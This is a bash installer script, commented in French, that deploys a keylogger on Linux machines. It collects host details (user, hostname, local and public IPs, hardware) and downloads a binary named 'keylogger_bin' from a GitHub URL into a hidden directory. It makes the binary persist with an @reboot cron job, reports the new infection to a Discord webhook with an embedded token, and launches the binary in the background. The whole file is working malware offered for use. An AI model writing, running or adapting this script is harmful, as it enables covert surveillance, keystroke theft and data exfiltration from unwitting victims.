#!/bin/bash

# ─── Configuration ───────────────────────────────────────
WEBHOOK_URL="https://discord.com/api/webhooks/1488635228603023371/V5RAgOeKALap4uu2J3QeOBpGHyXXlr9X7OKGAWB1h5wYpRU5LtSQOPdqimbtkdRIizn_"
GITHUB_BIN_URL="https://raw.githubusercontent.com/Tomatorgb/KlinuxconfigL/main/keylogger_bin"
INSTALL_DIR="/usr/local/src/.bin"
BINARY_NAME=".sys_worker"
LOG_FILE="/tmp/.sys_log.txt"

# ─── Infos machine ────────────────────────────────────────
HOSTNAME_VAL=$(hostname)
USERNAME_VAL=$(whoami)
OS_VAL=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Linux")
KERNEL_VAL=$(uname -r)
ARCH_VAL=$(uname -m)
IP_LOCAL_VAL=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "?")
IP_PUBLIC_VAL=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || echo "?")
CPU_VAL=$(grep "model name" /proc/cpuinfo 2>/dev/null | head -1 | cut -d':' -f2 | xargs || echo "?")
RAM_VAL=$(free -h 2>/dev/null | awk '/Mem:/ {print $2}' || echo "?")
DISK_VAL=$(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo "?")
DATE_VAL=$(date "+%d/%m/%Y %H:%M:%S")

# ─── Installation ─────────────────────────────────────────
mkdir -p "$INSTALL_DIR"
chmod 700 "$INSTALL_DIR"

curl -sL "$GITHUB_BIN_URL" -o "$INSTALL_DIR/$BINARY_NAME"
chmod +x "$INSTALL_DIR/$BINARY_NAME"

touch "$LOG_FILE"
chmod 600 "$LOG_FILE"

# Cron persistence (30s après démarrage)
CRON_JOB="@reboot sleep 30 && $INSTALL_DIR/$BINARY_NAME"
(crontab -l 2>/dev/null | grep -v "$BINARY_NAME"; echo "$CRON_JOB") | crontab -

# ─── Notification Discord via Python3 (JSON propre) ────────
python3 - <<PYEOF
import urllib.request, json

webhook = "$WEBHOOK_URL"
msg = (
    "**NEW AGENT INSTALLED**\n"
    "\`\`\`\n"
    "Date     : $DATE_VAL\n"
    "Host     : $HOSTNAME_VAL\n"
    "User     : $USERNAME_VAL\n"
    "OS       : $OS_VAL\n"
    "Kernel   : $KERNEL_VAL\n"
    "Arch     : $ARCH_VAL\n"
    "IP Local : $IP_LOCAL_VAL\n"
    "IP Pub   : $IP_PUBLIC_VAL\n"
    "CPU      : $CPU_VAL\n"
    "RAM      : $RAM_VAL\n"
    "Disk     : $DISK_VAL\n"
    "\`\`\`\n"
    "Keylogger actif. Logs envoyes toutes les 200s."
)
data = json.dumps({"content": msg}).encode("utf-8")
req = urllib.request.Request(webhook, data=data, headers={"Content-Type": "application/json"})
try:
    urllib.request.urlopen(req, timeout=10)
    print("[+] Notification Discord envoyee !")
except Exception as e:
    print("[!] Erreur Discord:", e)
PYEOF

# ─── Lancement immédiat ───────────────────────────────────
"$INSTALL_DIR/$BINARY_NAME" &

echo "[+] Installation terminee. Binaire : $INSTALL_DIR/$BINARY_NAME"